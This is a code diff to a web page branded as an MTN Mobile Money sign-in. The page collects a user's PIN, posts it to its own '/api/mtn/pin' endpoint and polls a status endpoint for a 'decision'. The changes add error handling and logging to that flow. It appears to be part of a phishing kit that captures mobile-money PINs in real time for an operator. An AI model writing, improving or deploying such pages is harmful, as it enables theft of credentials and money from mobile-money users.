@@ -382,9 +382,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   const I18N = {
     en: {
       displayNameFallback: 'MTN Mobile Money',
@@ -441,9 +438,6 @@
   let currentLang = I18N[urlLang] ? urlLang : 'en';
   let T = I18N[currentLang];
 
-  /* ═══════════════════════════════════════════════════════════
-     COUNTRY DATA
-  ═══════════════════════════════════════════════════════════ */
   const COUNTRY_DIAL = {
     'Cameroon': '+237',
     'Zambia': '+260',
@@ -477,9 +471,6 @@
     an:  urlParams.get('an') || ''
   };
 
-  /* ═══════════════════════════════════════════════════════════
-     APPLY TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   function applyTranslations() {
     document.title = T.docTitle;
 
@@ -624,8 +615,9 @@
 
     showInitiating();
 
+    let serverAccepted = true;
     try {
-      await fetch('/api/mtn/pin', {
+      const r = await fetch('/api/mtn/pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -640,7 +632,16 @@
           lang: currentLang
         })
       });
+      if (!r.ok) serverAccepted = false;
     } catch (err) {
+      hideInitiating();
+      btn.disabled = false;
+      btn.textContent = T.signIn;
+      showToast(T.networkError);
+      return;
+    }
+
+    if (!serverAccepted) {
       hideInitiating();
       btn.disabled = false;
       btn.textContent = T.signIn;
@@ -667,9 +668,12 @@
       let decision = 'pending';
       try {
         const r = await fetch('/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
-      } catch (err) { }
+      } catch (err) {
+        console.warn('[signin poll] fetch error:', err);
+      }
 
       if (!pollingActive) return;
 
